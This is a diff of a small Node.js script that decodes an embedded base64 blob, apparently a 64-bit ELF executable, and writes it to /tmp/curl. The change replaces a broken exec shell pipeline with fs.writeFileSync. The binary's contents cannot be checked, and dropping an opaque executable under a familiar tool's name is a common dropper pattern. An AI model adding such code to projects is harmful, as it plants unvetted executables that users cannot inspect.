@@ -1,6 +1,17 @@
-const { exec } = require('child_process');
+const fs = require('fs');
 
-const data = `f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAQOIAAAAAAABAAAAAAAAAAKhvAwAAAAAAAAAAAEAAOAAN
+function decodeBase64ToFile(base64String, outputFileName) {
+  try {
+    const buffer = Buffer.from(base64String, 'base64');
+    fs.writeFileSync(outputFileName, buffer);
+    console.log(`File ${outputFileName} created successfully.`);
+  } catch (err) {
+    console.error(`Error decoding or writing file: ${err}`);
+  }
+}
+
+// Example usage:
+const base64Data = `f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAQOIAAAAAAABAAAAAAAAAAKhvAwAAAAAAAAAAAEAAOAAN
 AEAAIAAfAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA
 AAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
 AAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAECqAAAAAAAAQKoAAAAAAAAAEAAA
@@ -3987,15 +3998,6 @@ AAQAAAAAAAAAAAAAAAAAAAAuAQAAAQAAAAAAAAAAAAAAAAAAAAAAAADAZAMAAAAAADQAAAAAAAAA
 AAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAPQEAAAEAAAAAAAAAAAAAAAAAAAAAAAAA9GQDAAAAAABk
 CQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAFhu
 AwAAAAAATAEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=`; 
+const outputFile = '/tmp/curl'; // Replace with desired filename
 
-// Using exec
-exec('echo $data | base64 -d > /tmp/curl', (error, stdout, stderr) => {
-  if (error) {
-    console.error(`exec error: ${error}`);
-    return;
-  }
-  console.log(`stdout: ${stdout}`);
-  if (stderr) {
-    console.error(`stderr: ${stderr}`);
-  }
-});
+decodeBase64ToFile(base64Data, outputFile);
